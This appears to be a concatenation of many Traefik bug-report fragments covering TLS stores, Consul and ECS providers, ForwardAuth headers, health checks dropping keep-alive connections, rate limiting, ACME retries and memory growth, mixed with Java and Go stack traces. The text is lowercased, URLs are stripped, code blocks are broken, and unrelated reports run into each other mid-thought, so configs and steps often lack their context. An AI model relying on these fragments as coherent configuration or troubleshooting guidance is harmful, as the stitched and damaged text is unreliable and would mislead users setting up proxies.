org.springframework.web.filter.onceperrequestfilter.dofilter(onceperrequestfilter.java:119) at org.apache.catalina.core.applicationfilterchain.internaldofilter(applicationfilterchain.java:193) at org.apache.catalina.core.applicationfilterchain.dofilter(applicationfilterchain.java:166) at com.github.nkonev.aaa.config.tracerloggingfilter.dofilter(tracerloggingfilter.java:38) at javax.servlet.http.httpfilter.dofilter(httpfilter.java:52) at org.apache.catalina.core.applicationfilterchain.internaldofilter(applicationfilterchain.java:193) at org.apache.catalina.core.applicationfilterchain.dofilter(applicationfilterchain.java:166) at io.opentracing.contrib.web.servlet.filter.tracingfilter.dofilter(tracingfilter.java:189) at org.apache.catalina.core.applicationfilterchain.internaldofilter(applicationfilterchain.java:193) at org.apache.catalina.core.applicationfilterchain.dofilter(applicationfilterchain.java:166) at ch.qos.logback.access.servlet.teefilter.dofilter(teefilter.java:53) at org.apache.catalina.core.applicationfilterchain.internaldofilter(applicationfilterchain.java:193) at org.apache.catalina.core.applicationfilterchain.dofilter(applicationfilterchain.java:166) at org.apache.catalina.core.standardwrappervalve.invoke(standardwrappervalve.java:202) at org.apache.catalina.core.standardcontextvalve.invoke(standardcontextvalve.java:96) at org.apache.catalina.authenticator.authenticatorbase.invoke(authenticatorbase.java:541) at ch.qos.logback.access.tomcat.logbackvalve.invoke(logbackvalve.java:256) at org.apache.catalina.core.standardhostvalve.invoke(standardhostvalve.java:139) at org.apache.catalina.valves.errorreportvalve.invoke(errorreportvalve.java:92) at org.apache.catalina.core.standardenginevalve.invoke(standardenginevalve.java:74) at org.apache.catalina.connector.coyoteadapter.service(coyoteadapter.java:343) at org.apache.coyote.http11.http11processor.service(http11processor.java:373) at org.apache.coyote.abstractprocessorlight.process(abstractprocessorlight.java:65) at org.apache.coyote.abstractprotocol$connectionhandler.process(abstractprotocol.java:868) at org.apache.tomcat.util.net.nio2endpoint$socketprocessor.dorun(nio2endpoint.java:1674) at org.apache.tomcat.util.net.socketprocessorbase.run(socketprocessorbase.java:49) at org.apache.tomcat.util.net.abstractendpoint.processsocket(abstractendpoint.java:1104) at org.apache.tomcat.util.net.nio2endpoint.setsocketoptions(nio2endpoint.java:335) at org.apache.tomcat.util.net.nio2endpoint$nio2acceptor.completed(nio2endpoint.java:436) at org.apache.tomcat.util.net.nio2endpoint$nio2acceptor.completed(nio2endpoint.java:391) at java.base/sun.nio.ch.invoker.invokeunchecked(invoker.java:127) at java.base/sun.nio.ch.invoker$2.run(invoker.java:219) at java.base/sun.nio.ch.asynchronouschannelgroupimpl$1.run(asynchronouschannelgroupimpl.java:112) at java.base/java.util.concurrent.threadpoolexecutor.runworker(threadpoolexecutor.java:1128) at java.base/java.util.concurrent.threadpoolexecutor$worker.run(threadpoolexecutor.java:628) at org.apache.tomcat.util.threads.taskthread$wrappingrunnable.run(taskthread.java:61) at java.base/java.lang.thread.run(thread.java:834)
caused by: java.io.ioexception: org.apache.tomcat.util.http.fileupload.fileuploadexception: stream closed at org.apache.catalina.connector.request.parseparts(request.java:2916) at org.apache.catalina.connector.request.getparts(request.java:2771) at org.apache.catalina.connector.requestfacade.getparts(requestfacade.java:1098) at javax.servlet.http.httpservletrequestwrapper.getparts(httpservletrequestwrapper.java:359) at javax.servlet.http.httpservletrequestwrapper.getparts(httpservletrequestwrapper.java:359) at javax.servlet.http.httpservletrequestwrapper.getparts(httpservletrequestwrapper.java:359) at javax.servlet.http.httpservletrequestwrapper.getparts(httpservletrequestwrapper.java:359) at javax.servlet.http.httpservletrequestwrapper.getparts(httpservletrequestwrapper.java:359) at javax.servlet.http.httpservletrequestwrapper.getparts(httpservletrequestwrapper.java:359) at org.springframework.web.multipart.support.standardmultiparthttpservletrequest.parserequest(standardmultiparthttpservletrequest.java:95) ..
caused by: org.apache.tomcat.util.http.fileupload.fileuploadexception: stream closed at org.apache.tomcat.util.http.fileupload.fileuploadbase.parserequest(fileuploadbase.java:308) at org.apache.catalina.connector.request.parseparts(request.java:2869) ..
caused by: java.io.ioexception: stream closed at org.apache.catalina.connector.inputbuffer.read(inputbuffer.java:359) at org.apache.catalina.connector.coyoteinputstream.read(coyoteinputstream.java:132) at java.base/java.io.filterinputstream.read(filterinputstream.java:133) at org.apache.tomcat.util.http.fileupload.util.limitedinputstream.read(limitedinputstream.java:132) at org.apache.tomcat.util.http.fileupload.multipartstream$iteminputstream.makeavailable(multipartstream.java:977) at org.apache.tomcat.util.http.fileupload.multipartstream$iteminputstream.read(multipartstream.java:881) at java.base/java.io.inputstream.read(inputstream.java:205) at org.apache.tomcat.util.http.fileupload.util.streams.copy(streams.java:98) at org.apache.tomcat.util.http.fileupload.util.streams.copy(streams.java:68) at org.apache.tomcat.util.http.fileupload.multipartstream.readbodydata(multipartstream.java:572) at org.apache.tomcat.util.http.fileupload.multipartstream.discardbodydata(multipartstream.java:596) at org.apache.tomcat.util.http.fileupload.multipartstream.skippreamble(multipartstream.java:614) at org.apache.tomcat.util.http.fileupload.impl.fileitemiteratorimpl.findnextitem(fileitemiteratorimpl.java:217) at org.apache.tomcat.util.http.fileupload.impl.fileitemiteratorimpl.<init>(fileitemiteratorimpl.java:131) at org.apache.tomcat.util.http.fileupload.fileuploadbase.getitemiterator(fileuploadbase.java:255) at org.apache.tomcat.util.http.fileupload.fileuploadbase.parserequest(fileuploadbase.java:279) ..
120 more ```
aim: i wanted to have a default tls cert for traefik read from k8s secret
added tlsstore as mentioned below.
added traefik deployment with image: traefik:v2.2.
added configmap that doesn't have store, since tlsstore is been defined already
apiversion: traefik.containo.us/v1alpha1
kind: tlsstore
metadata: name: default namespace: ingress
spec: defaultcertificate: secretname: tls-cert
i'm using consul catalog with traefik v2.3 using exposed by default and a single service
**consul service definition**
{ "services": [ { "address": "10.10.0.8", "tags": [ "traefik.http.routers.my-router.rule=host(`grafana.example.com`)", "traefik.http.services.my-service.loadbalancer.server.scheme=http" ], "enable_tag_override": false, "id": "my-service-id", "name": "grafana", "port": 3000, "tagged_addresses": { "lan": { "address": "10.10.0.8", "port": 3000 } }, "weights": { "passing": 1, "warning": 1 } } ]
``` **traefik docker commands**
``` - --log - --log.level=debug - --accesslog=true - --entrypoints.web.address=:80/tcp - --entrypoints.websecure.address=:443/tcp - --accesslog=true - --providers.consulcatalog=true - --providers.consulcatalog.endpoint.address= - --providers.consulcatalog.exposedbydefault=true
since i moved to 2.3.0-rc4, traefik panics during start-up with the following call stack: ```
stack: goroutine 59 [running]: runtime/debug.stack( , , ) /usr/local/go/src/runtime/debug/stack.go:24 +
github.com/containous/traefik/v2/pkg/safe.defaultrecovergoroutine( , ) /go/src/github.com/containous/traefik/pkg/safe/routine.go:66 +
github.com/containous/traefik/v2/pkg/safe.gowithrecover.func1.1( ) /go/src/github.com/containous/traefik/pkg/safe/routine.go:56 +
panic( , ) /usr/local/go/src/runtime/panic.go:969 +
runtime/internal/atomic.goload64( , , ) /usr/local/go/src/runtime/internal/atomic/atomic_arm.go:131 +
github.com/go-kit/kit/metrics/generic.(*counter).add( , , ) /go/pkg/mod/github.com/go-kit/kit@v0.9.0/metrics/generic/generic.go:46 +
github.com/containous/traefik/v2/pkg/metrics.(*pilotcounter).add( , , ) /go/src/github.com/containous/traefik/pkg/metrics/pilot.go:229 +
github.com/go-kit/kit/metrics/multi.counter.add( , , , , ) /go/pkg/mod/github.com/go-kit/kit@v0.9.0/metrics/multi/multi.go:20 +
main.setupserver.func3( , , , ) /go/src/github.com/containous/traefik/cmd/traefik/traefik.go:258 +
github.com/containous/traefik/v2/pkg/server.(*configurationwatcher).loadmessage( , , , ) /go/src/github.com/containous/traefik/pkg/server/configurationwatcher.go:150 +
github.com/containous/traefik/v2/pkg/server.(*configurationwatcher).listenconfigurations( , , ) /go/src/github.com/containous/traefik/pkg/server/configurationwatcher.go:132 +
github.com/containous/traefik/v2/pkg/safe.(*pool).goctx.func1() /go/src/github.com/containous/traefik/pkg/safe/routine.go:36 +
github.com/containous/traefik/v2/pkg/safe.gowithrecover.func1( , ) /go/src/github.com/containous/traefik/pkg/safe/routine.go:59 +
created by github.com/containous/traefik/v2/pkg/safe.gowithrecover /go/src/github.com/containous/traefik/pkg/safe/routine.go:53 +
``` the offending call is in src/github.com/containous/traefik/pkg/metrics/pilot.go:229 ``` pc.(*pilotcounter).c.add(delta)
``` looks like it's related to the new pilot functionality
and indeed, if i remove my pilot token from my static configuration, the problem doesn't occur.
we are notificing rss memory of traefik process running within kubernetes pod container keeps growing, eventually reaching the configured memory limits and getting oomkilled
i tried to close all log output, but the memory usage is still keeps growing without release after a few days
![image_20200818145555](
![image_20200818145603]( ![image_20200818145613](
![image_20200818145622](
i deploy traefik using daemonset in k8s client connection traefik use http/1.1 the client sends post request with keep-alive head and the reponse exceeds 4kb
the connection is busy o idle situation
started traefik v2.3 container with following commands:
``` "--providers.ecs", "--providers.ecs.autodiscoverclusters=false", "--providers.ecs.clusters=test-cluster", "--providers.ecs.exposedbydefault=false", "--entrypoints.web.address=:8080", "--entrypoints.traefik.address=:8081", "--api.dashboard=true", "--api.insecure=true"
i'm running traefik inside a 3 master node ha kubernetes cluster, and the file uploads fails randomly, sometimes it works, sometimes it fails
i've tryed setting the maximum file size, and rising the max number of retry, in middleware but it keeps failing the cluster is running behind a f5 load balancer working as a https reverse proxy
i have haproxy in front of **dockerized** traefik in **swarm-mode** to load-balance requests to servers in a private network, with proxy-protocol to identify source ip addresses.
i perform tcp-checks for each entrypoint i use, but these result in the following errors in traefik : `"error while peeking first byte: read tcp 192.168.224.3:110->10.1.1.1:52524: read: connection reset by peer"`
i ran traefik in docker with file provider with/without tls and with/without hostsni for a redis server hosted on a different server (public ip) whenever i either turned on tls or i made hostsni my domain, i would get a 400 bad request (as i desribe below)
i tried a basic http router/service and it worked well
even the traefik dashboard was under tls and it worked fine, so i know tls isn't the issue.
i'm trying to passthrough a https tls connection through the keycloak container via tcp.
i'm doing because i want to use client authentication via x509 certificates and i didn't get it up and running via the https router.
this is just a report of the question which i posted on the forum and didn't get any possible solution
i think it can be a potential issue in the traefik that's why i am creating this bug report
forum: so, i was playing with the rate limit middleware to figure the best values for it
and, i configured the middleware to look for ip in the x-forwarded-for header
i just bombarded the server with thousands of requests via blazemeter, which has, let say, ip1
and then i was trying to reach the server with my local machine which has ip2
but i was getting 429 most of the time on my local machine
i don't know what i did wrong or if this is the expected behavior
**server setup** alb --> traefik --> nodejs > note: traefik does receive the user's ip in the x-forwarded-for header
i pasted the log below
this thing bugging me for a few days
any help would be appreciated.
i launched traefik in ecs task in fargate, with an attached task role
just try plugin on traefik pilot :)
load dashboard, navigate to "http routers"
updated to traefik version 2.2.6 -> backend config not working anymore (other port than 80 and 443) but working on 2.2.2
created 10 routers with 1 service, the service only has 1 server
(i have simplified the configuration, we have 130 routers to 2 services, each router is a project pointing to a cluster, develop or production) the routers have individual files each one, where n a number from 1 to 10
`/etc/traefik/projectn_develop_intern.yaml` ```
http: routers: projectn_develop_intern: service: cluster_develop-cluster entrypoints: - https rule: pathprefix(`/project-n/`) && host(`develop.my-domain.com`) middlewares: [] priority: 1
``` the service has 1 health: `/etc/traefik/conf.d/cluster_develop-cluster.yaml`
http: services: cluster_develop-cluster: loadbalancer: healthcheck: path: /health timeout: 3s interval: 5s servers: - url: ' passhostheader: true
- exposed a service running in docker swarm behind traefik
- the service includes a content-length header in the response and a transfer-encoding: chunked
- performed a curl head request against it
- `curl -i `
this appears to be a repeat of #1323 ( (which was fixed) but it appears to have come back in 2.2
i am using traefik as an ingress controller for kubernetes
i created an ingress route:
apiversion: traefik.containo.us/v1alpha1
kind: ingressroute
metadata: name: test-ingress namespace: test
spec: entrypoints: - websecure routes: - match: host(`testname`) && pathprefix(`/api`) kind: rule services: - name: test-svc scheme: https port: 8443 tls: store: name: default
when i try to access the backend it works fine if there is no double slash after the hostname but if there is a double slash i get a 404 error
i tried to add a middleware to route //api to /api but it wasn't working for me
(works fine)
(404)
(works fine)
i'm running traefik in docker
i'm using the image v.2.2.2 (upgrading from v.2.2.1)
oddly enough, sometimes traefik returns http 404 responses
this happens randomly and at the same time on different web browsers
for example, i open up `test.foo.org` with google chrome and i get a 404
immediately after, i open the same url with safari and it works
if i refresh the page with google chrome, it keeps not working
reverting to v.2.2.1 removes this issue coming back to v.2.2.2 reintroduces that problem
update from v2.2.1 to v2.2.2
i can copy over the content, but there is an explanation with details on the community forums:
i am using some external certificate management to sign certificates for different subdomain wildcards to be used
they are all loaded in via [dynamic configuration]( #user-defined) by [watching a folder of configuration files]( #watch)
assume one certificate is signed to cover `example.com` (cn) and `*.example.com` (san)
this certificate is also configured to be the sni default certificate [as described here]( #default-certificate)
another certificate covers `subdomain.example.com` (cn) and `*.subdomain.example.com` (san).
configured traefik to listen on udp for teamspeak 3 (udp 9987, tcp:30033 tcp:10011) and mumble (tcp/udp 64738)
traefik is configured with host networking on the nodes as there's no load balancers and i want traefik to see the origin ip for some middlewares i use for other services.
this is my acme configuration: ```yml
certificatesresolvers: letsencrypt: acme: email: "admin@xxx" caserver: " " storage: "/data/acme.json" keytype: "ec384" dnschallenge: provider: inwx delaybeforecheck: 30 # inwx ns1 (+ipv6), ns2 (+ipv6), quad9 (+ipv6) resolvers: ["192.174.68.104", "2001:67c:1bc::104", "176.97.158.104", "2001:67c:10b8::104", "9.9.9.9", "2620:fe::fe"] letsencrypt-staging: acme: email: "admin@xxx" caserver: " " storage: "/data/acme-staging.json" keytype: "ec384" dnschallenge: provider: inwx delaybeforecheck: 30 # inwx ns1 (+ipv6), ns2 (+ipv6), quad9 (+ipv6) resolvers: ["192.174.68.104", "2001:67c:1bc::104", "176.97.158.104", "2001:67c:10b8::104", "9.9.9.9", "2620:fe::fe"] ``` and this is the docker-compose config for the traefik container: ```yml
version: \'3\' services: traefik: image: traefik:v2.2 restart: always labels: # api dashboard - "traefik.enable=true" - "traefik.http.routers.api.rule=host(`xxx.de`) && (pathprefix(`/dashboard`) || pathprefix(`/api`))" - "traefik.http.routers.api.service=api@internal" - "traefik.http.routers.api.tls=true" - "traefik.http.routers.api.tls.certresolver=letsencrypt" - "traefik.http.routers.api.middlewares=auth" - "traefik.http.middlewares.auth.basicauth.users=admin:xxx" # http to https redirect - "traefik.http.routers.http-catchall.rule=hostregexp(`{host:.+}`)" - "traefik.http.routers.http-catchall.entrypoints=http" - "traefik.http.routers.http-catchall.middlewares=redirect-to-https@docker" - "traefik.http.middlewares.redirect-to-https.redirectscheme.scheme=https" ports: - "80:80" # http - "443:443" # https environment: - inwx_username={{ inwx_username | mandatory }} - inwx_password={{ inwx_password | mandatory }} volumes: - /var/run/docker.sock:/var/run/docker.sock:ro - ./traefik.yml:/etc/traefik/traefik.yml - /srv/traefik/:/data/ networks: - traefik networks: traefik: external: true
``` and this is the docker-compose config for the main website container:
version: \'3\' services: nginx: image: \'nginx:1.17\' restart: always hostname: \'xxx.de\' labels: - "traefik.enable=true" - "traefik.http.routers.nginx.rule=host(`www.xxx.de`) || host(`xxx.de`)" - "traefik.http.middlewares.nginx.redirectregex.regex=^ " - "traefik.http.middlewares.nginx.redirectregex.replacement= {1}" - "traefik.http.services.nginx.loadbalancer.server.port=80" - "traefik.http.routers.nginx.tls=true" - "traefik.http.routers.nginx.tls.certresolver=letsencrypt" volumes: - \'/srv/nginx:/usr/share/nginx/html:ro\' networks: - traefik networks: traefik: external: true
```
the header 'x-forwarded-method' is missing from request received by backend server
it's missing also when using forwardauth
i'm trying to get traefik with forwardauth to work with my authentication server
the server needs all information from the original request including all headers, uri, method, body
while working on this, i noticed that the method is not received by the authentication server
i reduced my setup to a minimal setup and still the header is missing
tested this behavior with chrome, firefox, httpie.
setup two servers on [hetzner.com]( - **cpx21**: amd based, 3 vcpu, 4 gb ram - **cx21**: intel based, 2 vcpu, 4gb ram deployed some (~7) web services using docker compose and traefik.
use a long regex to mimic a negative lookahead inside a middleware.
when service timeout, accesslog field `originstatus` is 502
``` labels: traefik.enable: true
i'm trying to use `headers` and `forwardauth` middlewares together like in config described below
i use `headers` to provide `cors` headers automatically for my services
after `headers` i use `forwardauth`
when` forwardauth` receives positive answer(e.g
`200`) everything works good, but in case when `forwardauth` receives negative answer(e.g
`403`) response goes straight to client without `cors` headers
this looks like in the new version the negative answer breaks the chain and upper middlewares are not triggered
thus, ajax request from browser can't get response body and can't know what's wrong with the request
in 2.1 all worked as expected but broken in 2.2.
i tried to use the docs here:
condifured providers as: ```
providers: file: directory: /etc/traefik/routes.yaml watch: true
```
i noticed that traefik maintains persistent http connections to backend servers for services, which is great
however, i also noticed that when a health check is configured for a service, the persistent connection is killed each time traefik executes the health check
i was able to reproduce this using the "basic-example" from the quickstart guide
download the "basic-example" docker-compose.yml file from the traefik github repo.
uncomment the debug log level line in the command section.
start the services using `docker-compose`.
start a shell in the traefik container (e.g
`docker run -it <container id> sh`).
in the shell, check the established connections involving port 80 (e.g
`netstat -an | grep ":80 " | grep "established"`) and confirm that there aren\'t any.
hit in the browser (once).
back in the shell, check the established connections involving port 80
confirm that there's a connection from the host to the traefik container, and another from the traefik container to the whoami container.
continue to check until both connections have been closed - this should take 90 - 120 seconds.
close the shell and stop the services using `docker-compose`.
modify the docker-compose file to add a simple health check for the whoami service, e.g.: "traefik.http.services.whoami.loadbalancer.healthcheck.path=/" best to allow the default interval to be used, which iirc is 30 seconds.
start the services using `docker-compose`.
start a shell in the traefik container.
in the shell, check the established connections involving port 80 and confirm that there aren't any.
monitor the logs, and wait until a health check refresh entry ("refreshing health check for backend: whoami@docker") appears.
hit in the browser(once).
back in the shell, check the established connections involving port 80
confirm that there's a connection from the host to the traefik container, and another from the traefik container to the whoami container.
check a few more times over a few seconds to confirm that both connections remain.
wait for the next health check refresh.
check the connections again, and note that there's only one - the one from the host to the traefik container
the connection from the traefik container to the whoami container has been closed
of particular note here is that the default health check interval is 30 seconds, which is significantly shorter than the amount of time the persistent connection between the traefik container and the whoami container remained open (~90 seconds) when the health check was not enabled
i did some research, and it seems that this may be being caused by the fact the code for the health check closes the response body without reading the entire body first
as per the go documentation for the `do` function for `net.http.client`: > if the body is not both read to eof and closed, the client\'s underlying roundtripper (typically transport) may not be able to re-use a persistent tcp connection to the server for a subsequent "keep-alive" request
i wrote a tiny client server setup to check this, and confirmed that the connection does persist and is reused while the client reads the entire response body before closing it, and that the connection is closed if it simply closed the response body without reading the entire response body first.
i startup traefik in the exact same way multiple times in a ci environment, but i end up with different outcomes in traefik's acme server interaction using the [go-acme/lego]( library.
gracefully shutdown traefik, query prometheus stats, see that `traefik_entrypoint_open_connections` and `traefik_service_open_connections` metrics do not decrease
i upgraded from docker image 2.0 to 2.2.1.
i added the new crds and updated rbac as per the migration guide.
i have authelia running in a docker container that i use as middleware for sso for other containers
i also use it as middleware for an http router defined in a toml config file, which i pass to the file provider
my router definition looks like this: ```toml
[http.routers.proxmox-router] entrypoints = ["websecure"] rule = "host(`proxmox.example.com`)" service = "proxmox" middlewares=["authelia@docker"]
``` which works fine - upon testing i do get redirected to the authelia login when i go to `proxmox.example.com`.
specifying a header retention, skip or redaction spec in the access logs filtering section of [the config]( #limiting-the-fields) is case-sensitive to the header as received by traefik
per [rfc 2616]( #sec4.2), header names are case insensitive and many tools now prefer lowercase header name specification to reflect this
regardless, traefik should normalize the header name to account for a mismatch between the header as listed in the config and the header name received over http.
we are using traefik and redis in same kubernetes cluster
redis is used for changing routing configuration dynamically
everything is working fine until pod with redis is restarted
after this traefik does not receive configuration updates
also there is nothing in debug output
we have single pod with redis, so for reproducing it is enough to delete this pod, wait until it is restarted and update redis key with new configuration.
* installed traefik2 with helm from here [traefik-helm-chart]( (namespace:kube-system)
* check: ingressroute successful installed
* check: ingressroute traefik-dashboard is routable * try to install kubernetes dashboard with helm from here [kubernetes-dashboard chart]( (namespace:kube-system)
* apply this ingressroute ```
apiversion: traefik.containo.us/v1alpha1
kind: ingressroute
metadata: name: kubernetes-dashboard
spec: entrypoints: - web routes: - match: pathprefix(`/ui`) kind: rule middlewares: - name: strip-ui services: - name: kubernetes-dashboard port: 443 ----
apiversion: traefik.containo.us/v1alpha1
kind: middleware
metadata: name: strip-ui
spec: stripprefix: prefixes: - "/ui" - "/ui/"
``` > try browsing of 'my_ip/ui' ```
# kubectl logs traefik-pod -f
level=error msg="subset not found for kube-system/kubernetes-dashboard" providername=kubernetescrd ingress=kubernetes-dashboard namespace=kube-system
after a rate limit problem from let's encrypt, my account rate limit has been increased
right after this evolution, traefik get my account back in rate limit and is now stuck at this point.
we handle many domains throught traefik and let's encrypt.
i've seen some logs that are suspicious, and i think there is a bug in traefik retry algorithm that is making us out of quota
in fact, as my account is rate limited, traefik is trying a new order **every minutes for all domains**
so my quota is never reset in let's encrypt and we keep above let's encrypt 300 new orders per 3 hours limit.
setup `compress` middleware with `excludedcontenttypes` = `text/plain`
i try to use traefik as proxy in front of dns server
server with traefik has two ip addresses.
- run traefik as reverse proxy for iperf3 tcp and udp traffic: `docker-compose up reverse-proxy`
- run iperf3 server: `docker-compose up iperf3server`
- run iperf3 client over udp and with 128 kbps speed limit: `docker-compose up iperf3client`
user provided a potential bug report and reproducible steps
i followed the instructions provided, with a couple of exceptions as noted below
`./sbt akka/runmain com.example.helloworld.greeterclient` => `runmain` did not work on my machine, alternatively i executed `akka/run`, and selected #1 to execute the program
i confirmed that traefik left connections open by inspecting the log of the server application that was running at the time.
we moved our api endpoint to another url
the api sends cors headers so it's accessible from other domains
on the old url, which also has a web server hosting content, i set up a router with two middlewares, a redirectregex to the new url and one with the headers set
i also tried the chain middleware with the same result.
i'll trying to add an ingressroute using `headersregexp` to match a literal `.` (dot) in an ip address
withe the following config:
apiversion: traefik.containo.us/v1alpha1
kind: ingressroute
metadata: name: bug namespace: traefik
spec: entrypoints: - web routes: - match: host(`dummy.host`) && headersregexp(`x-real-ip`, `172\\..*`) kind: rule services: - name: dummy-svc namespace: dummy-test port: 80
```
configure traefik with kubernetscrd using ingressroute, ingressroutetcp, and ingressrouteudp
i think it might be correlated with my ingressroutetcp.
configured redirectscheme middleware as per the documentation at #port
trying to connect to my site, manually modifying each time the hosts file and target the site to all the nodes of the swarm, one at time
pointing the hosts file statically to node 1 and node 2 go fine, and the correct renewed certificate is obtained
only for node 3 i obtain the old certificate.
i define a middleware with docker provider:
labels: - "traefik.http.middlewares.nc-custom-headers.headers.customresponseheaders.strict-transport-security=max-age=15552000"
``` i have activated dashboard so i open the corresponding middleware page.
i used cors headers as mentioned in the [docs]( #cors-headers) with `compress=true`
existing user, bad password: username is not present in the log
$ curl
> 172.26.0.1 - - [20/apr/2020:14:09:03 +0000] "get /user-exists-badpass http/1.1" 401 17 "-" "-" 5 "whoami@docker" "-" 1ms
`172.26.0.1 - -` **please note no username is logged** 2
existing user, good password: username is present in the log
$ curl
> 172.26.0.1 - test [20/apr/2020:14:07:08 +0000] "get /user-exists-goodpass http/1.1" 200 396 "-" "-" 3 "whoami@docker" " " 9ms
unknown user: username is not present in the log
$ curl
> 172.26.0.1 - - [20/apr/2020:14:14:49 +0000] "get /no-exists http/1.1" 401 17 "-" "-" 1 "whoami@docker" "-" 0ms
i configured dynamic setting as following:
[http.services] [http.services.rt0] [http.services.rt0.loadbalancer] [[http.services.rt0.loadbalancer.servers]] url = " " [[http.services.rt0.loadbalancer.servers]] url = " " [http.services.rt0.loadbalancer.healthcheck] path = "/hc" interval = "10s" timeout = "3s"
i started service at
and service is stopped (actually it is not started) in dashboard of rt0 service, i can see
down
up
``` it is correct
but if i try press f5 every second in about 15 times, the service at is displayed as up in 1-2 seconds and down again
this is the screen i sometime saw it.
up
up
it is very strange, because i have never started the service at 192.168.10.42 is windows server (2016)
i couldn't duplicate issue in linux.
i tried to execute curl from traefik host it kept waiting for very long time
(although no service at it is version v2.2.0
configure the ratelimit middleware for an endpoint using the `requestheadername` sourcecriterion.
looking at ```
# enable api and dashboard
[api] # enable the api in insecure mode # # optional # default: true # # insecure = false
``` but then using my own config: ```
```
i disabled content type detection on my https entrypoint via the middleware: ````yaml
http: middlewares: content-type: contenttype: autodetect: false entrypoints: https: address: :443 http: middlewares: - content-type
just running traefik as an ingress controller on kubernetes
open the dashboard at `..../dashboard/#/http/routers`
now add a new router
i have a service behind traefik that uses windows auth
as stated here #when-is-http2-not-supported, windows auth is not supported with http/2
unfortunately it seems to me like traefik always uses http/2 when the service scheme is https
this leads to the following error in the traefik debug log: ```
traefik | time="2020-03-31t16:31:51z" level=debug msg="\'500 internal server error\' caused by: stream error: stream id 3; http_1_1_required"
``` if i run the backend service with http instead of https, then windows auth succeeds
i looked at the traefik dashboard.
version: 2.1.9
kubernetes-crd config:
[entrypoints] [entrypoints.http] address = "xxx" [entrypoints.http.transport] [entrypoints.http.transport.lifecycle] requestacceptgracetimeout = "60s" gracetimeout = "60s" [entrypoints.http.transport.respondingtimeouts] readtimeout = "60s" writetimeout = "60s" idletimeout = "180s" [entrypoints.http.forwardedheaders] insecure = true [entrypoints.https] address = "xxxx" [entrypoints.https.transport] [entrypoints.https.transport.lifecycle] requestacceptgracetimeout = "60s" gracetimeout = "60s" [entrypoints.https.transport.respondingtimeouts] readtimeout = "60s" writetimeout = "60s" idletimeout = "180s" [entrypoints.https.forwardedheaders] insecure = true [entrypoints.admin] address = "xxxx" [entrypoints.admin.forwardedheaders] insecure = true [entrypoints.traefik] address = "127.0.0.1:8086"
``` log info
{"level":"error","msg":"error in go routine: runtime error: invalid memory address or nil pointer dereference","time":"2020-03-26t19:39:07+08:00"}
{"level":"error","msg":"stack: goroutine 101 [running]:\ runtime/debug.stack( , , )\ \\t/usr/local/go/src/runtime/debug/stack.go:24 + \ github.com/containous/traefik/v2/pkg/safe.defaultrecovergoroutine( , )\ \\t/go/src/github.com/containous/traefik/pkg/safe/routine.go:66 + \ github.com/containous/traefik/v2/pkg/safe.gowithrecover.func1.1( )\ \\t/go/src/github.com/containous/traefik/pkg/safe/routine.go:56 + \ panic( , )\ \\t/usr/local/go/src/runtime/panic.go:967 + \ github.com/containous/traefik/v2/pkg/metrics.(*prometheusstate).listenvalueupdates( )\ \\t/go/src/github.com/containous/traefik/pkg/metrics/prometheus.go:264 + \ github.com/containous/traefik/v2/pkg/metrics.initstandardregistry.func1()\ \\t/go/src/github.com/containous/traefik/pkg/metrics/prometheus.go:99 + \ github.com/containous/traefik/v2/pkg/safe.gowithrecover.func1( , )\ \\t/go/src/github.com/containous/traefik/pkg/safe/routine.go:59 + \ created by github.com/containous/traefik/v2/pkg/safe.gowithrecover\ \\t/go/src/github.com/containous/traefik/pkg/safe/routine.go:53 + \ ","time":"2020-03-26t19:39:07+08:00"}
error in go routine: runtime error: invalid memory address or nil pointer dereference stack: goroutine 101 [running]:
runtime/debug.stack( , , ) /usr/local/go/src/runtime/debug/stack.go:24 +
github.com/containous/traefik/v2/pkg/safe.defaultrecovergoroutine( , ) /go/src/github.com/containous/traefik/pkg/safe/routine.go:66 +
github.com/containous/traefik/v2/pkg/safe.gowithrecover.func1.1( ) /go/src/github.com/containous/traefik/pkg/safe/routine.go:56 +
panic( , ) /usr/local/go/src/runtime/panic.go:967 +
github.com/containous/traefik/v2/pkg/metrics.(*prometheusstate).listenvalueupdates( ) /go/src/github.com/containous/traefik/pkg/metrics/prometheus.go:264 +
github.com/containous/traefik/v2/pkg/metrics.initstandardregistry.func1() /go/src/github.com/containous/traefik/pkg/metrics/prometheus.go:99 +
github.com/containous/traefik/v2/pkg/safe.gowithrecover.func1( , ) /go/src/github.com/containous/traefik/pkg/safe/routine.go:59 +
created by github.com/containous/traefik/v2/pkg/safe.gowithrecover /go/src/github.com/containous/traefik/pkg/safe/routine.go:53 +
``` issue * traefik process can not stop * error in go routine: runtime error: invalid memory address or nil pointer dereference
- create service with annotation.traefik.ingress.kubernetes.io/affinity: "true"
- configure traefik to use specific set of trusted ips
- configure it to log all requests to access log file
- send an http request with `x-forwarded-for: 1.2.3.4` header from an untrusted ip `5.6.7.8`
executing traefik 2.2.0-rc4 on kubernetes 1.17.2, logs are filled with ```
{"level":"warning","msg":"ingress ns/ingress: the apiversion \'extensions/v1beta1\' is deprecated, use \'networking.k8s.io/v1beta1\' instead.", "time": "..."}
``` this warning is printed out at least once per second.
i've updated all the ingresses to `networking.k8s.io/v1beta1` api version, but nothing has changed.
activate tls 1.3 on traefik 1.7.22
the configuration below is working for traefik v1.7.21
cd $(mktemp -d)
export kubeconfig=$pwd/conf
kind create cluster # download values and ingress
curl -l | tar xzv --strip 1 # deploy traefik and create ingress helm install traefik stable/traefik --values traefik_values.yaml
kubectl apply -f ingress.yaml # create token account for testing
this represents an analog for oidc auth.
kubectl create sa test
kubectl get clusterrolebinding cluster-admin -o yaml | yq \'.subjects[.subjects | length] |=.+ {kind: "serviceaccount", name: "test", namespace: "default"}\' | kubectl apply -f - # set some variables to use when we switch configs
token="$(kubectl get secret "$(kubectl get serviceaccounts test -o jsonpath=\'{.secrets[0].name}\')" -o jsonpath=\'{.data.token}\' | base64 -d)"
pod="$(kubectl get pod -l app=traefik -o jsonpath=\'{.items[0].metadata.name}\' )" # port forward to traefik since we can\'t reach the node port from the host
kubectl port-forward $pod 8443:443 & # create a kubeconfig that uses token auth
yq -y \'.users[0]={name: "kind-kind", user: { token: "\'$token\'" }}\' conf | yq -y \'.clusters[0].cluster.server=" "\' > conf-token kubectl --kubeconfig conf-token --insecure-skip-tls-verify -v9 port-forward $pod 8080
we have deployed traefik v2.1 on a couple of nodes, limited to 128 mb memory each
this setup has been running stable ever since trafik 2.x was released
last night our traefik deployments have been automatically updated from v2.1.6 to v2.1.7
since then the instances are regularly oom-killed
the following grafana chart shows the difference in behavior (old: constant memory usage after a ramp-up, new: restart cycles due to ooms): ![image]( ![image](
try adding a middleware to an `ingress` per the doc of the new feature in 2.2
```
